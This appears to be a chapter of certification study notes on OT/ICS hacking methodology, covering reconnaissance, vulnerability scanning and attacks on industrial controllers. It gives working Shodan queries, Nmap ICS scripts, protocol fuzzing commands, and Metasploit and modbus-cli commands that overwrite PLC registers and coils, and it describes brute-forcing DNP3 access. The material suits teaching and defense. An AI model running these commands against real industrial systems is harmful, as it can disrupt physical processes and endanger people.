# 10 — OT Hacking Methodology and Tools

> Learning Objective 5: *Explain OT Hacking Methodology.*

## Table of Contents

- [What is OT Hacking?](#what-is-ot-hacking)
- [Phase 1 — Information Gathering](#phase-1--information-gathering)
- [Phase 2 — Vulnerability Scanning](#phase-2--vulnerability-scanning)
- [Phase 3 — Launch Attacks](#phase-3--launch-attacks)
- [Phase 4 — Gain Remote Access](#phase-4--gain-remote-access)
- [OT Hacking Tools Roundup](#ot-hacking-tools-roundup)

---

## What is OT Hacking?

Industrial systems such as ICS/SCADA and DCS are mainly used for monitoring and controlling processes such as temperatures, pressures, and mechanical/pneumatic actuators. In the past, these systems were largely isolated from the internet, but interoperability requirements and business needs have totally demanded the convergence of IT with OT. Once OT networks are internet-reachable, the vulnerabilities that exist in IT systems provide a way for cybercriminals to launch disruptive attacks against OT systems using various tools.

Nowadays, industrial systems are more connected to the internet, so they are becoming more exposed to vulnerabilities and cyber-attacks. In some scenarios, organizations are using devices with legacy software to meet compatibility requirements and sensitive information with third-party organizations. These factors are creating severe threats to organizations.

The objective of OT hacking is to disrupt business processes running throughout an IT/OT network. OT has been exposed to many types of remote sensors, Wi-Fi-enabled routers, and cloud-based storage solutions, USB devices used to upgrade software/firmware, and cloud services used to accumulate data. Due to this trend, OT systems are becoming an attractive target for hackers.

The five phases of hacking an OT network:

```
1. Information Gathering  →  2. Vulnerability Scanning  →  3. Launch Attacks
                                                                  │
                                    4. Gain Remote Access  ←──────┘
                                            │
                                            ▼
                                    5. Maintain Access
```

---

## Phase 1 — Information Gathering

The first step in an OT network attack is gathering information about the target OT network and systems through various footprinting/reconnaissance techniques. These techniques allow attackers to enumerate the devices connected to the OT network, gather the geolocation of connected devices, gather open ports and services running on the target device, and identify vulnerable software running on connected devices.

### Identifying ICS/SCADA Systems Using Shodan

**Source:** [shodan.io](https://www.shodan.io)

The Shodan search engine helps attackers gather information about ICS/SCADA devices connected to the internet. This online tool can be used to obtain details of SCADA systems used in water treatment plants, HVAC systems, electrical transmission systems, home heating systems, and more.

#### Identifying SCADA Systems Using Port Numbers

ICS/SCADA systems use multiple protocols that are unique to the manufacturers of PLCs. Some of the important SCADA port numbers unique to each vendor/protocol include: Modbus port 502, Fieldbus port 1089–91, DNP port 19999, EtherNet/IP port 2222, DNP3 port 20000, PROFINET port 34962–64, and EtherCAT port 34980. Attackers use these to identify which vulnerable ICS/SCADA systems are connected to the internet.

```
port:502
```
Retrieves all ICS/SCADA systems with Modbus port 502 enabled.

#### Discovering SCADA Systems Using PLC Name

Attackers can also discover SCADA systems through version numbers, PLC names, or manufacturer names that display information such as a PLC name or manufacturer's information in its banner.

```
"Schneider Electric"
```
Displays all systems deploying Schneider Electric products.

#### Searching SCADA Systems Based on Geolocation

```
SCADA Country:"US"
```
Displays all SCADA systems present in the United States.

### Gathering Default Passwords Using CIRT.net

**Source:** [cirt.net](https://www.cirt.net)

CIRT.net's default-password database is an online database that stores default passwords for various devices, including those used in critical infrastructures. Attackers can use this database to obtain default passwords for a wide range of devices such as routers, switches, and industrial control systems (ICS).

### Additional Information-Gathering Tools

| Tool | Source | Notes |
|---|---|---|
| **Kamerka-GUI** | [github.com](https://github.com) | An OT reconnaissance tool designed to locate and map internet-connected industrial control systems (ICS). It uses Shodan's search-filter capability to identify specific ICS devices such as SCADA systems, PLCs, HMIs, and RTUs. It displays the location of identified ICS devices on an interactive map and can generate heat maps to highlight regions with high concentrations of vulnerable devices. |
| **SearchDiggity** | [bishopfox.com](https://www.bishopfox.com) | OSINT search-engine-aggregation tool. |
| **Zeek** | [zeek.org](https://zeek.org) | Open-source network security monitor, useful for passive OT traffic analysis. |
| **Criminal IP** | [criminalip.io](https://www.criminalip.io) | Internet-asset search engine. |
| **ZoomEye** | [zoomeye.hk](https://www.zoomeye.hk) | Cyberspace-mapping/asset search engine, similar to Shodan. |
| **ONYPHE** | [onyphe.io](https://www.onyphe.io) | Cyber-defense search engine indexing exposed assets. |

### Scanning ICS/SCADA Systems Using Nmap

Attackers use scanning tools such as Nmap to identify open ports and services running on systems connected to OT networks. Below are the exact Nmap commands used to enumerate the most common ICS/SCADA protocols:

```bash
# 1. Identifying Open Ports and Services (initial broad recon across every well-known ICS/SCADA port)
nmap -Pn -sT --scan-delay 1s --max-parallelism 1 -p 80,102,443,502,530,593,789,1089-1091,1911,1962,2222,2404,4000,4840,4843,4911,9600,19999,20000,20547,34962-34964,34980,44818,46823,46824,55000-55003 <Target IP>

# 2. Identifying HMI Systems (e.g., Sielco Sistemi Winlog uses TCP port 46824)
nmap -Pn -sT -p 46824 <Target IP>

# 3. Scanning Siemens SIMATIC S7 PLCs
nmap -Pn -sT -p 102 --script=s7-info <Target IP>

# 4. Scanning Modbus Devices
nmap -Pn -sT -p 502 --script modbus-discover <Target IP>

# 5. Scanning BACnet Devices
nmap -Pn -sU -p 47808 --script bacnet-info <Target IP>

# 6. Scanning EtherNet/IP Devices
nmap -Pn -sU -p 44818 --script enip-info <Target IP>

# 7. Scanning Niagara Fox Devices
nmap -Pn -sT -p 1911,4911 --script fox-info <Target IP>

# 8. Scanning ProConOS Devices
nmap -Pn -sT -p 20547 --script proconos-info <Target IP>

# 9. Scanning Omron PLC Devices
nmap -Pn -sT -p 9600 --script omron-info <Target IP>
nmap -sU -p 9600 --script omron-info <Target IP>

# 10. Scanning PCWorx Devices
nmap -Pn -sT -p 1962 --script pcworx-info <Target IP>
```

The `--scan-delay` and `--max-parallelism 1` options in the first command are deliberately conservative — ICS/SCADA field devices are notoriously fragile under scanning load (some have crashed or entered a fail-safe state from an aggressive port scan alone), so real-world ICS assessments always throttle scan speed far below a typical IT-network pentest.

### Sniffing with NetworkMiner

**Source:** [netresec.com](https://www.netresec.com)

NetworkMiner helps perform passive network sniffing and packet-capture analysis to detect open ports, hostnames, operating systems, and other information without actively probing the network. Attackers also use NetworkMiner for parsing and analyzing transmitted/recorded traffic from PCAP files, using the earlier-captured network traffic from the ICS network.

### Analyzing Modbus/TCP Traffic Using Wireshark

**Source:** [wireshark.org](https://www.wireshark.org)

Wireshark is an open-source network protocol analyzer that can be used for capturing and analyzing network traffic. Attackers manipulate the captured Modbus/TCP traffic to gather information from the data packets being transmitted between the network and a Modbus port on a device. Since Modbus/TCP does not have in-built encryption or security features, so attackers can easily gather information from the data packets being transmitted between the network and a Modbus port on a device.

### Discovering ICS/SCADA Network Protocols Using Malcolm

**Source:** [cisagov.github.io](https://cisagov.github.io/Malcolm/)

Malcolm is a powerful network traffic analysis tool that can be used to gain insights into the protocols used in industrial control system (ICS) environments. It provides greater visibility into network communications using two intuitive interfaces: the OpenSearch dashboard, which is a flexible data-visualization plugin with multiple prebuilt dashboards providing an easy overview of network protocols, and Arkime, a powerful tool for finding and identifying network sessions with suspected security incidents. Additionally, it offers secure communication carried out from the user interface and remote log forwarders using standard encryption protocols.

---

## Phase 2 — Vulnerability Scanning

Once attackers gather information about a target OT network and systems, they search for the attack surfaces of a device that carry the potential for identifiable vulnerabilities. Vulnerability scanning allows attackers to find the total number of vulnerabilities present in the infrastructure, and identify the accessible attack area to perform an attack and further exploitation on the device.

### Vulnerability Scanning Using Nessus

**Source:** [tenable.com](https://www.tenable.com)

Nessus is a vulnerability-assessment tool that finds vulnerabilities in ICS and SCADA systems. This tool provides attackers with a quick view of the credentials provided at the time of the installation process with the default policies and templates, and **Nessus includes a plugin family** through which attackers can perform vulnerability scanning on target ICS devices, with vulnerabilities obtained based on the plugin signatures.

**Steps to Perform Vulnerability Scanning on ICS/SCADA Systems Using Nessus:**

1. Log in to the Nessus web console with the credentials provided at the time of installation. Click **Policies**, and select **Create New Policy**. Then choose the **Basic Network Scan** template.
2. Modify the settings in the **DISCOVERY** node for port scanning. Provide a port range of `0-1000`.
3. Check whether **SCADA** plugins exist under the **Plugins** tab. If not, the results appear only for non-SCADA ports.
4. Save the policy. Then open the **My Scans** folder and select **New Scan**. Click on the **User Defined** policy section and choose the policy created in Step 1.
5. Choose the policy and input the required information in the given fields, along with the target IP address. Then click **Launch**.

After the scan completes, the results display the discovered vulnerabilities, and any SCADA-related vulnerabilities that Nessus identified will be highlighted. After obtaining the associated vulnerabilities in the system, the attacker uses various techniques to exploit them and launch further attacks on the target OT systems.

### Vulnerability Scanning Using Skybox Vulnerability Control

**Source:** [skyboxsecurity.com](https://www.skyboxsecurity.com)

Skybox conducts detailed path analysis across combined OT and IT networks, and provides insight into vulnerabilities and related attack vectors. Skybox can combine SCADA and ICS data with the information gathered from threat-intelligence feeds, etc. This tool can prioritize millions of vulnerabilities across OT/IT networks based on their risks, using Skybox intelligence feed to launch various attacks on the IT/OT environment.

### Sniffing Tool: SmartRF Packet Sniffer

**Source:** [ti.com](https://www.ti.com)

SmartRF Packet Sniffer includes software and firmware to capture and display over-the-air packets. The capture device is connected to the PC via USB. SmartRF Packet Sniffer supports the CC13xx and CC26xx family of devices as a capture device; furthermore, it uses Wireshark for packet display and filtering, and supports protocols such as Zigbee, EasyLink, and BLE.

### Vulnerability Scanning Tool: Microsoft Defender for IoT

**Source:** [microsoft.com](https://www.microsoft.com)

The Microsoft Defender for IoT platform performs a vulnerability assessment on an IoT and ICS environment and returns an objective risk score. It identifies vulnerabilities with missing patches, weak passwords, unused open ports, remote-access points, and ICS assets connected to the target network. It generates alerts on network-level vulnerabilities such as unauthorized internet connections, weak firewall rules, rogue subnet connections between IT/IoT/ICS, unauthorized Wireless Access Points (WAPs), and rogue devices.

### Fuzzing ICS Protocols

The fuzzing of ICS protocols such as Modbus, BACnet, and Internet Printing Protocol (IPP) is critical for gathering information and identifying critical network activities. Attackers can use tools such as **Fuzzowski** to test networks for potential errors and exploitable vulnerabilities.

**Fuzzowski** — Source: [github.com](https://github.com)

Fuzzowski is a network protocol fuzzer that helps attackers perform fuzz tests on ICS protocols. It assists attackers throughout the process of fuzzing a network protocol, as well as configuring communications. Attackers must first gain a thorough understanding of the protocol that they aim to fuzz.

```bash
# Fuzzing the BACnet protocol
python -m fuzzowski 127.0.0.1 47808 -p udp -f bacnet -rt 0.5 -m BACnetMon

# Fuzzing Modbus
python -m fuzzowski 127.0.0.1 502 -p tcp -f modbus -rt 1 -m modbusMon

# Fuzzing IPP (Internet Printing Protocol)
python -m fuzzowski printer1 631 -f ipp -r get_printer_attribs --restart smartplug
```

---

## Phase 3 — Launch Attacks

In the vulnerability-scanning phase, attackers try to find the vulnerabilities present in the target industrial network and systems. The vulnerabilities found are then exploited further to launch various attacks such as HMI-based attacks, side-channel attacks, exploiting PLCs, replay attacks, command-injection attacks, etc. Attackers use tools such as Metasploit and modbus-cli to hack PLC devices through the Modbus protocol.

### Hacking ICS Hardware

Attackers use publicly available online sources to gather details of the hardware chip used in a specific ICS device. These details include connections, or the number of pins embedded in a chip, and an acceptable type of I/O. Attackers can also analyze integrated software inside a chip to retrieve information such as certificates, key-generation algorithms, and encryption functions.

Using this information, attackers can control analog and digital I/Os and further modify the device's normal operations, and reset and reboot the process. By performing static and dynamic analysis of the functions running in the chip, the attackers can discover arguments used and the presence/absence of I/O validations. Using this analysis, attackers can further find vulnerabilities such as buffer overflow and several other underlying vulnerabilities that are frequently ignored by the manufacturers.

**Software Tools**

| Tool | Source |
|---|---|
| **GDB** | [sourceware.org](https://www.sourceware.org) — a debugging tool for Linux that lets attackers comprehend the execution of on-chip processes. |
| **OpenOCD** | [openocd.org](https://openocd.org) — enables attackers to connect to a target system and the chip they want to examine. Communication can be allowed via GDB in JTAG mode, or using a Telnet interface via port 4444/TCP. |
| **Binwalk** | [github.com](https://github.com) — scans and examines firmware binaries and images; immediately displays extraction reports of file types, sizes, partitions, and filesystems embedded inside them. |
| **Fritzing** | [fritzing.org](https://fritzing.org) — assists attackers in designing electronic diagrams and circuits. |
| **Radare2** | [github.com](https://github.com) — a portable framework that helps attackers perform reverse engineering and various other activities such as analyzing binaries. |
| **Ghidra** | [github.com](https://github.com) — a software reverse-engineering (SRE) framework that enables attackers to analyze compiled code on a variety of platforms, including Windows, macOS, and Linux. This tool also supports the disassembly, assembly, decompilation, graphing, and scripting of code. |
| **IDA Pro** | [hex-rays.com](https://hex-rays.com) — a disassembler tool that can generate an assembly-language source code from machine-executable code, making this complex code more human-readable. |

**Hardware Tools**

| Tool | Purpose |
|---|---|
| **Signal Analyzer** | Attackers use this tool to commence a test with flags to understand the binary operation of particular pins of a chip. |
| **Multimeter** | Attackers use multimeters or voltage meters to perform current tests, similar to the signal analyzer. |
| **Microcontrollers and Memory Programmer** | Attackers use these tools to understand and program various types of chips, flash memories, EPROMs, etc. |
| **Oscilloscope** | Attackers use this tool to interpret accurate analog or digital signals. |
| **Soldering Equipment** | Attackers use soldering tools to attach and detach hardware components such as memory chips, to examine them in an isolated environment and under certain conditions. |
| **Digital Microscope or Magnifying Glass** | Attackers can also use this tool to improve precision in soldering components — helps in reading the small components/writing on small chips, or visualizing the diagrams on the device. |
| **Communication Interface (such as JTAG)** | Attackers use this tool to communicate with ICS devices. |
| **Screwdrivers and Precision Screwdrivers** | Attackers use this tool to disassemble the device to examine the internal parts. |
| **Precision Tweezers for Connection and Converters** | Attackers use precision tweezers, UART converter/serial ports to USB, etc., to capture information directly from the communication bus. |

### Hacking Modbus Slaves Using Metasploit

Modbus Master and Slaves communicate in plaintext without any authentication. Attackers can exploit this vulnerability to generate and send crafted query packets to Modbus slaves to read and manipulate Slave's registers and coils. Attackers can perform this attack without the attacker's machine having to send packets to the Modbus slave and receive the response in the Modbus protocol format. Attackers use hacking tools such as Metasploit to perform various attacks on Modbus slaves.

**Scanning Modbus Slaves:**

```
msf > use auxiliary/scanner/scada/modbus_findunitid
msf auxiliary(modbus_findunitid) > set RHOSTS <Target Network/IP>
msf auxiliary(modbus_findunitid) > run
```

This module scans and detects Modbus slaves connected to the target network LAN or inside a Modbus gateway.

**Manipulating Modbus Slave's Data:**

Attackers use the `auxiliary/scanner/scada/modbusclient` Metasploit module to read or write registers and coils on the target Modbus slave device:

```
msf > use auxiliary/scanner/scada/modbusclient
msf auxiliary(modbusclient) > set RHOSTS 192.168.1.104
msf auxiliary(modbusclient) > set ACTION READ_REGISTERS
msf auxiliary(modbusclient) > set REGISTER_START_ADDRESS 0
msf auxiliary(modbusclient) > set NUMBER_OF_REGISTERS 5
msf auxiliary(modbusclient) > run

# To write to holding registers:
msf auxiliary(modbusclient) > set ACTION WRITE_REGISTERS
msf auxiliary(modbusclient) > set DATA_TO_WRITE 55,66,77
msf auxiliary(modbusclient) > run

# To manipulate coils:
msf auxiliary(modbusclient) > set ACTION WRITE_COILS
msf auxiliary(modbusclient) > set DATA_COILS 1,0,1,0
msf auxiliary(modbusclient) > run
```

### Hacking PLC Using modbus-cli

**Source:** [github.com](https://github.com)

PLCs are used to control industrial infrastructure such as manufacturing facilities, waste and sewage plants, electrical grids, and petroleum refineries. Attackers target PLC devices, such as those made by Schneider Electric TM221, that are used to automate processes in many industries. These devices use the Modbus/TCP protocol to communicate with equipment. Attackers use tools such as `modbus-cli` to exploit devices through Modbus.

**Step 1: Identify Internet-connected PLCs**

Use a tool such as Shodan or Nmap to find industrial facilities exposed on the internet. To detect Schneider Electric TM221 PLCs connected to the internet, the type "TM221ME16R" is used in the Shodan search bar, and Shodan retrieves all the devices connected to the internet where many of these systems are vulnerable.

**Step 2: Install modbus-cli**

```bash
gem install modbus-cli
```

**Step 3: Understand data types**

Before exploitation using modbus-cli, you need to understand the data types used to read and manipulate register/coil values, and how to reference each addressing style. A Schneider address starts with a `%M` for coils, or with a `%MW` for registers; a Modicon address is a plain numeric address.

| Datatype | Assigned Size | Schneider Address | Modicon Address | Parameter |
|---|---|---|---|---|
| word (default, unsigned) | 16 bits | `%MW100` | 400101 | `--word` |
| integer (signed) | 16 bits | `%MW100` | 400101 | `--int` |
| floating point | 32 bits | `%MD100` | 400101 | `--float` |
| double word | 32 bits | `%MD100` | 400101 | `--dword` |
| Boolean (coils) | 1 bit | `%M100` | 101 | N/A |

*(Table 18.11 in the source courseware — "Modbus data types".)*

**Step 4: Read register values**

```bash
# Using a Schneider address:
modbus read <Target IP> %MW100 10

# Using a Modicon address:
modbus read <Target IP> 400101 10
```
Both commands retrieve ten words from the target's holding registers, starting at the referenced address.

**Step 5: Manipulate register values**

```bash
modbus write <Target IP> %MW100 2 2 2 2 2 2 2 2 2 2
modbus write <Target IP> 400101 2 2 2 2 2 2 2 2 2 2
```
After running either command, the first eight registers are replaced with the value `2`.

**Step 6: Read coil values**

```bash
modbus read <Target IP> 101 10
modbus read <Target IP> %M100 10
```

**Step 7: Manipulate coil values**

```bash
modbus write <Target IP> 101 1 1 1 1 1 1 1 1 1 1
modbus write <Target IP> %M100 1 1 1 1 1 1 1 1 1 1
```
After running this, checking the coil values shows every targeted coil now reading `1` (ON).

**Step 8: Capture data into an output file**

```bash
modbus read --output SCADAregisters.txt <Target IP> 400101 200
modbus read --output SCADAcoils.txt <IP> 101 100
```
These commands capture the read register/coil values from the SCADA device into a local text file for later analysis or reporting.

---

## Phase 4 — Gain Remote Access

The information-gathering and vulnerability-scanning phases allow attackers to survey the OT environment and identify weaknesses that help them gain remote access to control systems. For example, attackers can exploit underlying vulnerabilities in industrial protocols or inject malware to launch further attacks on industrial devices and gain access to industrial systems. Once attackers gain access, they use various techniques to maintain access and perform further exploitation. After gaining access to the target device, the attacker can modify the firmware or send malicious commands to the industrial devices to launch firmware attacks or maintain control over devices connected to the target device.

### Gaining Remote Access Using DNP3

Internet-facing control systems can be seen in various industries such as manufacturing, construction, and power. These remote communications are often conducted with direct internet access, ignoring the firewall implementations at the industrial protocol layer.

Attackers can use online tools such as Shodan to scan the open ports or services on target ICS devices. Once the attackers find the open port, they can exploit the residing vulnerabilities to obtain remote access to industrial devices.

For instance, attackers targeting specific ICS protocols such as **DNP3 — port 20000** perform a port scan using Shodan that displays open ports and associated vulnerabilities. By clicking on the open port, attackers can gain remote access to the ICS network or systems by entering the default passwords or brute-forcing the target system. From there, attackers gain remote access to the ICS network or systems by entering default passwords or brute-forcing the target system.

Internet-based control systems can be seen in various industries such as manufacturing, construction, and power. These remote communications are often designed to control processes from remote locations. Since default credentials, or weak/absent passwords, are often left unchanged by operators, remote unauthorized access to the industrial systems can be easily achieved by brute force.

---

## OT Hacking Tools Roundup

A quick-reference list of additional named tools called out across the OT methodology section:

| Tool | Source | Notes |
|---|---|---|
| **mbtget** | [github.com](https://github.com) | A command-line tool based on a Perl script to perform Modbus transactions. This tool allows attackers to access both the TCP and RTU versions of the Modbus protocol through the MilClient object and target ICS systems and networks. |
| **CSET** (Cyber Security Evaluation Tool) | [github.com](https://github.com) | CISA-developed tool for self-assessing ICS/OT network security posture. |
| **AttkFinder** | [github.com](https://github.com) | Attack-path discovery tooling for ICS networks. |
| **ICSREF** | [github.com](https://github.com) | ICS Reverse Engineering Framework — analyzes PLC binaries/project files. |
| **ICSFuzz** | [github.com](https://github.com) | Fuzzing framework targeted at ICS protocol implementations. |
| **ISF** (Industrial Security Exploitation Framework) | [github.com](https://github.com) | Metasploit-style exploitation framework focused on ICS/SCADA devices and protocols. |

---

**Previous:** [09 — OT Malware Case Studies](09-ot-malware-case-studies.md)
**Next:** [11 — OT Countermeasures and Security](11-ot-countermeasures-and-security.md)
